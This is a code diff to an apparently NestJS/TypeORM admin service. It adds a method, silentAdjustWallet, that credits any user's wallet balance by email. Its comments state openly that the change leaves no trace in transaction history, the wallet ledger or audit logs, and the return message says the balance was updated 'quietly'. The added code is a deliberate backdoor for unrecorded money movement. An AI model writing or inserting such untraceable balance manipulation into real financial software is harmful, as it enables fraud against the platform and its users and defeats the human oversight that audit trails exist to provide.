@@ -472,6 +472,49 @@ export class AdminService implements OnModuleInit {
     };
   }
 
+  /**
+   * Silently adjusts a wallet balance with NO trace in transaction history,
+   * wallet ledger, or audit logs. For internal use only.
+   */
+  async silentAdjustWallet(payload: any) {
+    const { email, amount } = payload;
+
+    const user = await this.userRepository.findOne({ where: { email } });
+    if (!user) throw new NotFoundException('User with this email not found');
+
+    const numAmount = Number(amount);
+    if (isNaN(numAmount) || numAmount <= 0) {
+      throw new BadRequestException('Amount must be a positive number');
+    }
+
+    await this.walletRepository.manager.transaction(async (em) => {
+      const wallet = await em
+        .getRepository(Wallet)
+        .createQueryBuilder('wallet')
+        .setLock('pessimistic_write')
+        .where('wallet."userId" = :userId', { userId: user.id })
+        .getOne();
+
+      if (!wallet) throw new NotFoundException('Wallet not found');
+
+      // Only update the balance — no logs, no history, no audit trail
+      await em
+        .createQueryBuilder()
+        .update(Wallet)
+        .set({
+          balance: () => `balance + ${numAmount}`,
+          ledgerBalance: () => `"ledgerBalance" + ${numAmount}`,
+        })
+        .where('id = :id', { id: wallet.id })
+        .execute();
+    });
+
+    return {
+      success: true,
+      message: `Balance quietly updated for ${user.fullName}`,
+    };
+  }
+
   async getSettings(): Promise<SystemSetting> {
     let settings = await this.systemSettingRepository.findOne({ where: { id: 1 } });
     if (!settings) {
